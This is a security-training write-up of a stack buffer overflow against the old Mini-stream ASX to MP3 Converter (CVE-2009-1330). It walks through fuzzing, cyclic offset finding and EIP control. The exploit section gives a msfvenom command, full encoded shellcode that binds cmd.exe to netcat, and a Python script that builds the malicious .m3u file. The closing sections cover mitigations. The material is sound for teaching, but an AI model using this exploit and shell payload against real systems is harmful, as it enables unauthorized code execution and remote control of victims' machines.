---
title: "Windows Stack Smashing — ASXtoMP3Converter"
date: 2022-03-14
category: "windows-exploit"
difficulty: "intermediate"
source: "INE"
tags: [INE, intermediate, windows, immunity-debugger, msfvenom]
excerpt: "Classic Windows stack overflow in ASXtoMP3Converter via a malicious .m3u file: cyclic offset, EIP control and a reverse shell through a NOP sled."
cover: "/writeups/windows-stack-smashing/windows_stack_smashing-1.png"
draft: false
---

# Windows Stack Smashing — ASXtoMP3Converter

> This write-up is security-education material. The target is an old, deliberately-kept-vulnerable consumer application (`Mini-stream ASX to MP3 Converter`) run inside an isolated Windows VM that I own. Only ever apply these techniques to software and systems you own or are explicitly authorized to test. The CVE behind this bug is **CVE-2009-1330**.

## 1. What is a buffer overflow

A buffer overflow happens when a program writes more data into a fixed-size memory buffer than that buffer can hold, and the excess bytes spill into adjacent memory. When the buffer lives on the **call stack**, the bytes that get overwritten include data the CPU relies on to know *where to continue executing* after the current function returns. By carefully choosing what those overflowing bytes are, an attacker can redirect the program to code of their choosing.

This is the same core idea as my [Linux Buffer Overflow Foundation](/writeups/linux-bo-foundation/) write-up — read that first if the stack model is new to you, because the mechanics are identical. What changes on Windows is the *vector* (a file the application parses, not stdin), the *tooling* (Immunity Debugger + a Windows process instead of gdb), and a few platform conventions. The exploitation logic — find the offset, take over `EIP`, land in shellcode through a NOP sled — is the same.

### 1.1 The stack and the registers that matter (32-bit x86 recap)

ASXtoMP3Converter is a 32-bit application, so we are working with the classic 32-bit x86 model:

- The **stack** grows *downward* (toward lower addresses) with each function call. Each call gets a **stack frame** holding its local variables, the saved base pointer, and the **saved return address**.
- **ESP** — stack pointer, top of the stack.
- **EBP** — base pointer, anchors the current frame.
- **EIP** — instruction pointer, the address of the *next instruction the CPU will execute*. We never write `EIP` directly; we overwrite the **saved return address** on the stack, and the CPU loads it into `EIP` when the function returns.

When the application parses our `.m3u` file, it copies the URL string into a fixed-size stack buffer with an unbounded copy (the textbook `strcpy`/`lstrcpy`-style bug). The frame looks roughly like this:

```
   lower addresses
   ┌───────────────────────┐  <- ESP
   │  char urlbuffer[...]  │   the .m3u URL is copied in here ──────┐
   │  other locals         │                                       │
   │  saved EBP  (4 bytes) │                                       │ copy
   ├───────────────────────┤                                       │ direction
   │  saved return address │  <- overwrite THIS to control EIP <────┘
   ├───────────────────────┤
   │  caller's frame ...   │
   └───────────────────────┘
   higher addresses
```

Feed it a URL longer than `urlbuffer`, and the copy keeps writing *upward* — past the other locals, past the saved `EBP`, and straight into the **saved return address**. When the parsing function returns, the CPU pops that value into `EIP` and jumps there. Control those 4 bytes and we control execution.

### 1.2 The plan

This application has **no modern mitigations** (it predates widespread DEP/ASLR enforcement and ships without `/GS` stack cookies, ASLR, or a non-executable stack for this code path), so we use the simplest reliable technique — **classic shellcode injection**:

1. **Confirm the crash** and prove we reach the saved return address with attacker-controlled bytes.
2. **Find the exact offset** from the start of our input to the 4 bytes that land on the saved return address, using a cyclic pattern.
3. **Place shellcode** (a reverse/bind shell) into the buffer.
4. **Overwrite the saved return address** with an address that lands inside our shellcode, using a **NOP sled** so the landing is forgiving.

## 2. Setting up the environment

Download [ASX to MP3 Converter](https://www.exploit-db.com/apps/f4da5b43ca4b035aae55dfa68daa67c9-ASXtoMP3Converter.exe) and install it inside a disposable Windows VM. After installation the application lives at:

```
C:\Program Files (x86)\Mini-stream\ASX to MP3 Converter
```

We need two tools:

- **A debugger** to watch registers and memory at the moment of the crash. We use [Immunity Debugger](https://www.immunityinc.com/products/debugger/), the de-facto standard for Windows exploit development of this era. It scripts in Python and pairs with [mona.py](https://github.com/corelan/mona), Corelan's exploit-dev helper (pattern generation, bad-char comparison, ROP gadget search, etc.). x64dbg is a modern equivalent if you prefer.
- **A pattern / offset tool.** mona can do this, as can Metasploit's `pattern_create`/`pattern_offset`. Here we use **pwntools' `cyclic`** because it is quick and language-agnostic:

```bash
$ pip install pwntools
```

> **Why a debugger and not just running it?** A bare crash only tells us "it broke." We need to see *which register* holds *our bytes* at the moment of the fault — that is what tells us we own `EIP` and lets us measure the offset precisely. The debugger is non-optional for this work.

## 3. Finding the offset and a return address

### 3.1 Attach the target in Immunity Debugger

Open Immunity Debugger, press `F3` to open the *Open* dialog, browse to the **ASXtoMP3Converter** executable in its install directory, and select it.

![windows_stack_smashing-1.png](/writeups/windows-stack-smashing/windows_stack_smashing-1.png)

Press `F9` to let the process run. The application's GUI appears — the debugger is now attached and will catch any access violation (crash) live.

![windows_stack_smashing-2.png](/writeups/windows-stack-smashing/windows_stack_smashing-2.png)

Click **Load** and note the supported file types. This is the attack surface: the formats the application will parse for us.

![windows_stack_smashing-3.png](/writeups/windows-stack-smashing/windows_stack_smashing-3.png)

### 3.2 Fuzz the parser and confirm the crash

We target the `.m3u` format. An `.m3u` file is just a plain-text playlist — one media path or URL per line — so the parser will read our line and copy it into a buffer. Start by generating a file with a large block of `A`s (`0x41`), far more than any sane buffer:

```bash
$ python -c "print('A'*18000)" > Bof.m3u
```

Re-run the target and drag this file onto the **Load** button. Instead of crashing, it shows a *handled* error notification. The reason: `.m3u` is the **MP3 URL** format, so the parser validates that the line looks like a URL before copying it into the vulnerable buffer. We need our payload to pass that check, so we prefix it with a valid URL scheme:

```bash
$ python -c "print('http://' + 'A'*18000)" > Bof.m3u
```

Load that file. This time the application crashes, and in Immunity's register pane **`EIP` is `0x41414141`** — that is `"AAAA"`, our own bytes.

![windows_stack_smashing-4.png](/writeups/windows-stack-smashing/windows_stack_smashing-4.png)

This is the key moment. `EIP = 0x41414141` means the overflow reached the saved return address, the function returned into our data, and **we control the instruction pointer**. Now we need the *exact* offset where the 4 controlling bytes begin.

### 3.3 Find the precise offset with a cyclic pattern

Sending `'A'*18000` proves we reach `EIP` but not *where* within those 18000 bytes the critical 4 bytes are. For that we use a **cyclic pattern** (a De Bruijn sequence): every 4-byte window in it is unique, so whatever 4 bytes end up in `EIP` map back to exactly one position — and that position *is* the offset.

Restart the application in the debugger and generate the pattern:

```bash
$ pwn cyclic 18000     # or: cyclic 18000
```

Prefix it with `http://`, write it to `Bof.m3u`, and load it. At the crash, `EIP` holds **`0x78736761`** — a 4-byte slice of the pattern, not random noise. Ask `cyclic` which offset that slice came from:

```bash
$ cyclic -l 0x78736761
17417
```

> **Note on byte order.** `cyclic -l` expects the value the way `EIP` shows it. pwntools handles the little-endian conversion for you here; if you ever feed the raw memory bytes instead, remember x86 stores integers **little-endian**, so the on-stack bytes are the reverse of the displayed `EIP` value. Getting this backwards is the single most common reason a "correct" offset is off by a few bytes.

So the offset is **17417**: bytes 0–17416 are filler, and bytes 17417–17420 land exactly on the saved return address.

Verify it with a clean marker — 17417 filler bytes, then 4 `B`s. If the offset is right, `EIP` must become exactly `0x42424242` (`"BBBB"`):

```bash
$ python -c "print('http://' + 'A'*17417 + 'B'*4)" > Bof.m3u
```

![windows_stack_smashing-5.png](/writeups/windows-stack-smashing/windows_stack_smashing-5.png)

`EIP` is now `0x42424242` — confirmed. We have full, precise control of the instruction pointer.

### 3.4 Pick a return address

Controlling `EIP` only lets us *jump* somewhere; we still need somewhere worth jumping to. Look at the **stack pane** at the crash and scroll up slightly: there is a large run of `0x41414141` — that is our buffer sitting in memory, and it is where our shellcode will live.

![windows_stack_smashing-6.png](/writeups/windows-stack-smashing/windows_stack_smashing-6.png)

We pick an address near the *start* of that `A` region to use as the return address. We don't need pinpoint accuracy because a **NOP sled** (next section) widens the landing zone. In this exploit the chosen address is **`0x001480B8`**.

> **Caveat — and the more robust alternative.** A hard-coded stack address is the simplest approach and works here because there is no ASLR, but it can still drift between machines/OS builds. The production-grade technique is to instead point `EIP` at a static **`JMP ESP`** instruction inside a non-relocating module (find one with mona's `!mona jmp -r esp`); since `ESP` points at our buffer tail at the moment of return, `JMP ESP` reliably bounces execution into our shellcode regardless of where the stack landed. The stack-address method below is kept for clarity of the core concept.

## 4. Proof of Concept

We have the offset (17417) and a return address (`0x001480B8`). Now we need executable code to jump to.

### 4.1 Generate the shellcode

Shellcode is a small, position-independent blob of machine code. We generate a Windows command-execution payload with **msfvenom** on a Linux box. Here it launches `nc` as a listener bound to `cmd.exe` (adjust to a reverse shell — `windows/shell_reverse_tcp` — for a real engagement; the technique is identical):

```bash
$ msfvenom -p windows/exec CMD="nc -lvnp 4444 -e cmd.exe" -b '\x00' -f python
```

- `-p windows/exec` — payload: run a command on the target.
- `CMD=...` — the command to execute.
- `-b '\x00'` — **bad characters**. Our payload reaches the buffer through *string handling* (it is parsed as a URL), and string functions stop at the first NUL. Telling msfvenom that `\x00` is forbidden makes it encode the shellcode so it contains **no null bytes**, so the whole payload survives the copy intact. (Other bytes can be bad too — `\x0a`, `\x0d`, `\x2f` are common in path/URL parsers; if the exploit breaks mid-shellcode, add the offending byte here and regenerate.)
- `-f python` — emit the bytes as a Python `buf` variable we can paste into the exploit.

### 4.2 Assemble the payload

The layout, totalling the 17417-byte offset plus the 4-byte return address, is:

```
http:// | [ NOP sled (100) ][ shellcode ][ 'A' filler ] | [ ret = 0x001480B8 ]
        └──────────────── 17417 bytes total ────────────┘└── overwrites saved return ──┘
```

- **`http://`** — the URL-scheme prefix that gets the line past the parser's validation. It is consumed before the buffer, so it is *not* counted in the 17417 offset.
- **NOP sled (100 × `\x90`)** — a run of `NOP` ("do nothing, advance to the next instruction"). The return address points into this zone; wherever `EIP` lands in the sled, the CPU slides forward instruction-by-instruction until it falls into the real shellcode. This turns "hit one exact byte" into "hit anywhere in a 100-byte window."
- **shellcode** — the msfvenom payload, executed after sliding through the sled.
- **`'A'` filler** — pads the remainder so the *next* 4 bytes land exactly on the saved return address. Length = `offset - len(nop) - len(shellcode)`.
- **ret = `0x001480B8`** — overwrites the saved return address; points back into the NOP sled. `pack('<I', ...)` writes it **little-endian**, which is why it appears byte-reversed in memory.

```python
from struct import pack

# msfvenom -p windows/exec CMD="nc -lvnp 4444 -e cmd.exe" -b '\x00' -f python
buf =  b""
buf += b"\xd9\xe8\xd9\x74\x24\xf4\xbd\x5b\xa4\x5d\x38\x58\x31"
buf += b"\xc9\xb1\x35\x31\x68\x1a\x03\x68\x1a\x83\xe8\xfc\xe2"
buf += b"\xae\x58\xb5\xba\x50\xa1\x46\xdb\xd9\x44\x77\xdb\xbd"
buf += b"\x0d\x28\xeb\xb6\x40\xc5\x80\x9a\x70\x5e\xe4\x32\x76"
buf += b"\xd7\x43\x64\xb9\xe8\xf8\x54\xd8\x6a\x03\x88\x3a\x52"
buf += b"\xcc\xdd\x3b\x93\x31\x2f\x69\x4c\x3d\x9d\x9e\xf9\x0b"
buf += b"\x1d\x14\xb1\x9a\x25\xc9\x02\x9c\x04\x5c\x18\xc7\x86"
buf += b"\x5e\xcd\x73\x8f\x78\x12\xb9\x46\xf2\xe0\x35\x59\xd2"
buf += b"\x38\xb5\xf5\x1b\xf5\x44\x04\x5b\x32\xb7\x73\x95\x40"
buf += b"\x4a\x83\x62\x3a\x90\x06\x71\x9c\x53\xb0\x5d\x1c\xb7"
buf += b"\x26\x15\x12\x7c\x2d\x71\x37\x83\xe2\x09\x43\x08\x05"
buf += b"\xde\xc5\x4a\x21\xfa\x8e\x09\x48\x5b\x6b\xff\x75\xbb"
buf += b"\xd4\xa0\xd3\xb7\xf9\xb5\x6e\x9a\x97\x48\xfd\xa0\xda"
buf += b"\x4b\xfd\xaa\x4a\x24\xcc\x21\x05\x33\xd1\xe3\x61\xcb"
buf += b"\x98\xae\xc0\x44\x44\x3b\x51\x09\x77\x91\x96\x34\xfb"
buf += b"\x10\x67\xc3\xe3\x50\x62\x8f\xa4\x89\x1e\x80\x40\xae"
buf += b"\x8d\xa1\x41\xc0\x52\x3f\x1d\x3d\xb8\xd3\xab\x53\xb2"
buf += b"\x0b\x67\x98\x06\x78\xa7\xcd\x03\xa0\xc4\x60\xa8\x8e"
buf += b"\x6f\x03\x55\xcf"

offset = 17417
nop = b'\x90'
ret = pack('<I', 0x001480B8)        # little-endian: bytes B8 80 14 00 in memory

payload  = b'http://'               # passes the URL validation, not counted in offset
payload += b'\x90'*100              # NOP sled — forgiving landing zone
payload += buf                      # shellcode
payload += b'A'*(offset - 100 - len(buf))   # filler up to the saved return address
payload += ret                      # overwrites the saved return address

open('Bof.m3u', 'wb').write(payload)
```

Run this to produce `Bof.m3u`, start the listener / be ready to catch the shell, then drag `Bof.m3u` onto the application's **Load** button. The saved return address is overwritten with `0x001480B8`, the CPU slides down the NOP sled into the shellcode, and the command executes — game over for the target process.

![windows_stack_smashing-7.png](/writeups/windows-stack-smashing/windows_stack_smashing-7.png)

## 5. Troubleshooting & notes

Common issues when reproducing this:

- **The file is rejected, no crash.** The line failed URL validation — make sure the payload begins with `http://` and that the scheme prefix is *outside* the 17417-byte count.
- **`EIP` is not your control value.** The offset is wrong, or a bad character truncated the input before it reached the saved return address. Re-derive the offset with `cyclic`, and check for bad chars (`\x00`, `\x0a`, `\x0d`, `\x2f`).
- **`EIP` is correct but no code execution.** A bad character mangled the shellcode body. Compare the in-memory bytes against your payload (mona's byte-array comparison is built for this), add the offending byte to msfvenom's `-b` list, and regenerate.
- **Lands near the buffer but the process just dies.** The return address missed the sled, or the chosen stack address shifted on this machine. Widen the NOP sled, or switch to the `JMP ESP` technique (§3.4) so you no longer depend on a fixed stack address.
- **Works under the debugger but not standalone.** The debugger can shift memory layout slightly. A wider NOP sled usually absorbs the difference; the `JMP ESP` approach removes the dependency entirely.

## 6. Mitigations

This exploit works because the target is an old application with the defences of its era absent. On modern, properly-built Windows software:

- **DEP / NX** — the stack is non-executable, so shellcode-in-buffer never runs. The workaround is a ROP chain (e.g. calling `VirtualProtect` to re-mark the buffer executable) before the shellcode.
- **/GS stack cookies** — the compiler inserts a random canary before the saved return address and checks it on return, detecting the overwrite before `EIP` is hijacked.
- **ASLR** — module and stack base addresses are randomized each run, so a hard-coded return address (or even a static `JMP ESP`) is no longer reliable; an information leak is required.
- **SafeSEH / SEHOP** — hardens the structured-exception-handler overwrite variant of this bug class.
- **Root-cause fix** — the real defect is an unbounded string copy into a fixed stack buffer. Using a length-checked copy (`StringCchCopy`, `strncpy_s`, …) sized to the destination buffer removes the vulnerability entirely.

## 7. References

### 7.1 This bug & background

- [CVE-2009-1330 — Mini-stream ASX to MP3 Converter](https://nvd.nist.gov/vuln/detail/CVE-2009-1330) — the official entry for this vulnerability.
- [Exploit-DB: ASX to MP3 Converter local BOF](https://www.exploit-db.com/) — public proofs-of-concept for the same target.
- [Smashing The Stack For Fun And Profit — Aleph One, Phrack 49](http://phrack.org/issues/49/14.html) — the foundational 1996 paper on stack-overflow exploitation.
- [CWE-121: Stack-based Buffer Overflow](https://cwe.mitre.org/data/definitions/121.html) — the formal weakness classification.

### 7.2 Windows exploitation specifics

- [Corelan — Exploit writing tutorial part 1: Stack Based Overflows](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/) — the canonical Windows BOF walkthrough; this lab follows its method closely.
- [mona.py documentation](https://github.com/corelan/mona) — pattern generation, bad-char comparison, `jmp` gadget search, ROP chains.
- [Immunity Debugger](https://www.immunityinc.com/products/debugger/) — the debugger used here.
- [x64dbg](https://x64dbg.com/) — a modern, actively-maintained alternative.

### 7.3 Tooling

- [pwntools documentation](https://docs.pwntools.com/) — `cyclic`, `p32`/`u32`, packing helpers.
- [De Bruijn sequence — Wikipedia](https://en.wikipedia.org/wiki/De_Bruijn_sequence) — the maths behind unique-window offset finding.
- [msfvenom — Offensive Security](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) — payload generation, encoders, bad-char handling (`-b`).
- [msfvenom payloads cheatsheet](https://medium.com/@hannahsuarez/full-list-of-546-msfvenom-payloads-39adb4d793c9) — quick reference of available payloads.
- [Endianness — Wikipedia](https://en.wikipedia.org/wiki/Endianness) — why addresses are written little-endian.

### 7.4 Mitigations & where this goes next

- [Data Execution Prevention (DEP) — Microsoft](https://learn.microsoft.com/en-us/windows/win32/memory/data-execution-prevention) — the defence that breaks shellcode-in-buffer.
- [/GS buffer security check — Microsoft](https://learn.microsoft.com/en-us/cpp/build/reference/gs-buffer-security-check) — stack cookie protection.
- [ASLR on Windows — Microsoft](https://learn.microsoft.com/en-us/windows/win32/memory/address-space-layout-randomization) — address randomization.
- [Return-oriented programming — Wikipedia](https://en.wikipedia.org/wiki/Return-oriented_programming) — the technique used once DEP is enabled.
- Related in this series: [Linux Buffer Overflow Foundation](/writeups/linux-bo-foundation/), and the NX / canary / ASLR bypass write-ups.
